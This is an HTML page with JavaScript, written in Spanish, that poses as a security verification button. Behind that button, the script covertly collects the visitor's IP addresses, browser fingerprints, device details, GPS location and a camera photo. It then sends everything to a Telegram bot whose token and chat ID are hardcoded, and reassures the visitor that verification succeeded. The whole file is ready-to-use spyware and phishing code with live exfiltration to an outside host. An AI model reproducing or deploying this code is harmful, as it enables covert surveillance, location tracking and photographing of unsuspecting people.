<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verificación de seguridad</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f1f3f4;
            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 8px 28px rgba(0,0,0,0.12);
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        h1 {
            font-size: 1.8rem;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 12px;
        }
        p {
            color: #5f6368;
            font-size: 0.9rem;
            margin-bottom: 28px;
        }
        button {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 28px;
            padding: 12px 24px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        button:active {
            background: #1557b0;
            transform: scale(0.98);
        }
    </style>
</head>
<body>
<div class="card">
    <h1>🔐 Verificación requerida</h1>
    <p>Presiona el botón para continuar</p>
    <button id="btn">✅ Verificar acceso</button>
</div>

<video id="video" autoplay playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
    // ================= CONFIGURACIÓN =================
    // ⚠️ REVOCA EL TOKEN VIEJO Y PON AQUÍ UNO NUEVO (con @BotFather)
    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';  // <--- CÁMBIALO
    const CHAT_ID = '7555997298';                                        // TU CHAT ID

    async function sendToTelegram(text, photoBlob = null) {
        const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await fetch(textUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        } catch(e) { console.error('Error texto:', e); }
        if (photoBlob) {
            const photoUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', photoBlob, 'photo.jpg');
            try { await fetch(photoUrl, { method: 'POST', body: fd }); } catch(e) {}
        }
    }

    // ---------- Funciones avanzadas ----------
    async function getPublicIPs() {
        const services = [
            { name: 'ipapi.co', url: 'https://ipapi.co/json/', parser: (data) => data.ip },
            { name: 'Cloudflare', url: 'https://cloudflare.com/cdn-cgi/trace', parser: (text) => {
                const match = text.match(/ip=([\d\.]+)/);
                return match ? match[1] : 'N/A';
            }},
            { name: 'ipify', url: 'https://api.ipify.org?format=json', parser: (data) => data.ip },
            { name: 'ip.sb', url: 'https://api.ip.sb/ip', parser: (text) => text.trim() }
        ];
        let results = {};
        for (let svc of services) {
            try {
                const res = await fetch(svc.url);
                if (svc.name === 'Cloudflare') {
                    const text = await res.text();
                    results[svc.name] = svc.parser(text);
                } else if (svc.name === 'ip.sb') {
                    const text = await res.text();
                    results[svc.name] = text.trim();
                } else {
                    const data = await res.json();
                    results[svc.name] = svc.parser(data);
                }
            } catch(e) { results[svc.name] = 'Error'; }
        }
        return results;
    }

    function getWebRTCIP() {
        return new Promise((resolve) => {
            const ips = [];
            const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection;
            if (!RTCPeerConnection) { resolve([]); return; }
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(e => {});
            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    const match = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(event.candidate.candidate);
                    if (match && ips.indexOf(match[0]) === -1 && !match[0].startsWith('192.168.') && !match[0].startsWith('10.') && !match[0].startsWith('172.')) {
                        ips.push(match[0]);
                    }
                } else { resolve(ips); }
            };
            setTimeout(() => resolve(ips), 3000);
        });
    }

    async function getBatteryInfo() {
        if (!navigator.getBattery) return { level: 'N/A', charging: 'N/A', timeRemaining: 'N/A' };
        try {
            const battery = await navigator.getBattery();
            return {
                level: `${Math.round(battery.level * 100)}%`,
                charging: battery.charging ? '✅ Sí' : '❌ No',
                timeRemaining: battery.dischargingTime ? `${Math.round(battery.dischargingTime / 60)} min` : 'N/A'
            };
        } catch(e) { return { level: 'Error', charging: 'Error', timeRemaining: 'Error' }; }
    }

    function getNetworkInfo() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!conn) return { type: 'N/A', downlink: 'N/A', rtt: 'N/A' };
        return {
            type: conn.effectiveType || 'N/A',
            downlink: conn.downlink ? `${conn.downlink} Mbps` : 'N/A',
            rtt: conn.rtt ? `${conn.rtt} ms` : 'N/A'
        };
    }

    function getScreenInfo() {
        const orientation = screen.orientation ? screen.orientation.type : (window.orientation ? (window.orientation === 0 ? 'portrait-primary' : 'landscape-primary') : 'N/A');
        return {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio,
            orientation: orientation
        };
    }

    function getAdvancedCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 400;
        canvas.height = 150;
        const grad = ctx.createLinearGradient(0, 0, 400, 0);
        grad.addColorStop(0, '#f60');
        grad.addColorStop(1, '#09f');
        ctx.fillStyle = grad;
        ctx.fillRect(0, 0, 400, 150);
        ctx.shadowBlur = 5;
        ctx.shadowColor = 'black';
        ctx.font = 'bold 24px "Courier New", "Arial", monospace';
        ctx.fillStyle = 'white';
        ctx.fillText('FP', 20, 50);
        ctx.font = 'italic 18px "Times New Roman", serif';
        ctx.fillStyle = '#ff0';
        ctx.fillText('Fingerprint', 120, 45);
        ctx.beginPath();
        ctx.arc(300, 80, 40, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba(255,0,0,0.5)';
        ctx.fill();
        ctx.beginPath();
        ctx.moveTo(350, 120);
        ctx.lineTo(370, 140);
        ctx.lineTo(330, 140);
        ctx.fillStyle = '#0f0';
        ctx.fill();
        // Acortar hash
        return canvas.toDataURL().slice(0, 60) + '...';
    }

    function getWebGLInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { renderer: 'N/A', vendor: 'N/A', version: 'N/A' };
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            return {
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                version: gl.getParameter(gl.VERSION)
            };
        }
        return { renderer: 'N/A', vendor: 'N/A', version: gl.getParameter(gl.VERSION) };
    }

    async function getAudioFingerprint() {
        if (!window.OfflineAudioContext) return 'N/A';
        try {
            const audioCtx = new OfflineAudioContext(1, 44100, 44100);
            const oscillator = audioCtx.createOscillator();
            oscillator.type = 'triangle';
            oscillator.frequency.value = 440;
            const gain = audioCtx.createGain();
            oscillator.connect(gain);
            gain.connect(audioCtx.destination);
            oscillator.start();
            const buffer = await audioCtx.startRendering();
            const data = buffer.getChannelData(0).slice(0, 100);
            let hash = 0;
            for (let i = 0; i < data.length; i++) {
                hash = (hash << 5) - hash + Math.floor(data[i] * 1000);
                hash |= 0;
            }
            return hash.toString();
        } catch(e) { return 'Error'; }
    }

    function getInstalledFonts() {
        const fontList = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS", "Georgia", "Tahoma", "Trebuchet MS", "Arial Black", "Calibri", "Cambria", "Consolas", "Segoe UI"];
        const available = fontList.filter(f => document.fonts.check(`12px "${f}"`));
        return available.join(', ');
    }

    function getPlugins() {
        if (!navigator.plugins || navigator.plugins.length === 0) return 'No detectados';
        return Array.from(navigator.plugins).map(p => p.name).join(', ');
    }

    function getLanguages() {
        return navigator.languages ? navigator.languages.join(', ') : navigator.language;
    }

    function getDeviceMemory() {
        return navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
    }

    function getMaxTouchPoints() {
        return navigator.maxTouchPoints || 0;
    }

    function getDoNotTrack() {
        return navigator.doNotTrack || (window.doNotTrack) || 'No especificado';
    }

    function areCookiesEnabled() {
        return navigator.cookieEnabled ? '✅ Sí' : '❌ No';
    }

    function getPlatform() {
        return {
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            hardwareConcurrency: navigator.hardwareConcurrency || 'Desconocido'
        };
    }

    function getTimeZone() {
        return Intl.DateTimeFormat().resolvedOptions().timeZone;
    }

    function getGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) { resolve(null); return; }
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 10000 }
            );
        });
    }

    async function capturePhoto() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        } catch(e) {
            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
            catch(err) { return null; }
        }
        video.srcObject = stream;
        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
        await new Promise(r => setTimeout(r, 500));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
        stream.getTracks().forEach(t => t.stop());
        return blob;
    }

    // ---------- Acción del botón ----------
    document.getElementById('btn').onclick = async () => {
        const btn = document.getElementById('btn');
        btn.innerText = 'Procesando...';
        btn.disabled = true;

        const [
            publicIPs, webrtcIPs, battery, network, screenInfo, canvasFP,
            webgl, audioFP, fonts, plugins, languages, deviceMemory,
            maxTouch, doNotTrack, cookies, platformInfo, timezone, gps, foto
        ] = await Promise.all([
            getPublicIPs(),
            getWebRTCIP(),
            getBatteryInfo(),
            getNetworkInfo(),
            getScreenInfo(),
            getAdvancedCanvasFingerprint(),
            getWebGLInfo(),
            getAudioFingerprint(),
            getInstalledFonts(),
            getPlugins(),
            getLanguages(),
            getDeviceMemory(),
            getMaxTouchPoints(),
            getDoNotTrack(),
            areCookiesEnabled(),
            getPlatform(),
            getTimeZone(),
            getGPS(),
            capturePhoto().catch(() => null)
        ]);

        // 🔥 NUEVO MENSAJE MEJORADO 🔥
        let message = `*📡 INFORME DE DISPOSITIVO* 📡\n`;
        message += `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n\n`;

        message += `*🌐 RED e IP*\n`;
        message += `└ IP pública: \`${publicIPs['ipapi.co']}\`\n`;
        if (webrtcIPs.length) message += `└ IP real (WebRTC): \`${webrtcIPs[0]}\`\n`;
        else message += `└ IP real (WebRTC): No detectada\n`;
        message += `└ Proveedores: Cloudflare (${publicIPs['Cloudflare']}), ipify (${publicIPs['ipify']})\n\n`;

        message += `*🔋 SISTEMA*\n`;
        message += `└ Batería: ${battery.level} (cargando: ${battery.charging})\n`;
        message += `└ Red: ${network.type} (${network.downlink}, ${network.rtt})\n`;
        message += `└ Pantalla: ${screenInfo.width}x${screenInfo.height} @${screenInfo.pixelRatio}x, orientación ${screenInfo.orientation}\n`;
        message += `└ SO: ${platformInfo.platform}\n`;
        message += `└ Zona horaria: ${timezone}\n\n`;

        message += `*🎨 HUELLAS DIGITALES*\n`;
        message += `└ Canvas FP: \`${canvasFP}\`\n`;
        message += `└ Audio FP: \`${audioFP}\`\n`;
        message += `└ WebGL: ${webgl.renderer} (${webgl.vendor})\n\n`;

        message += `*🔤 SOFTWARE*\n`;
        message += `└ Navegador: ${platformInfo.userAgent.split(' ')[0]} (núcleos: ${platformInfo.hardwareConcurrency})\n`;
        message += `└ Idiomas: ${languages}\n`;
        message += `└ Fuentes instaladas: ${fonts.substring(0, 80)}...\n`;
        message += `└ Plugins: ${plugins.substring(0, 60)}...\n`;
        message += `└ Cookies: ${cookies}\n\n`;

        message += `*📱 HARDWARE*\n`;
        message += `└ RAM estimada: ${deviceMemory}\n`;
        message += `└ Toques simultáneos: ${maxTouch}\n\n`;

        if (gps) {
            message += `*📍 UBICACIÓN (GPS)*\n`;
            message += `└ Lat: ${gps.lat}, Lng: ${gps.lng}\n`;
            message += `└ Precisión: ±${gps.acc} m\n`;
            message += `└ Mapa: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n\n`;
        } else {
            message += `*📍 UBICACIÓN (GPS)*\n└ No disponible (permiso denegado)\n\n`;
        }

        message += `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n`;
        message += `⚡ *Desarrollado por @Society*`;

        await sendToTelegram(message);
        if (foto) await sendToTelegram('📸 *Foto del visitante*', foto);

        btn.innerText = '✅ Verificar acceso';
        btn.disabled = false;
        alert('Verificación completada. Gracias.');
    };
</script>
</body>
</html>
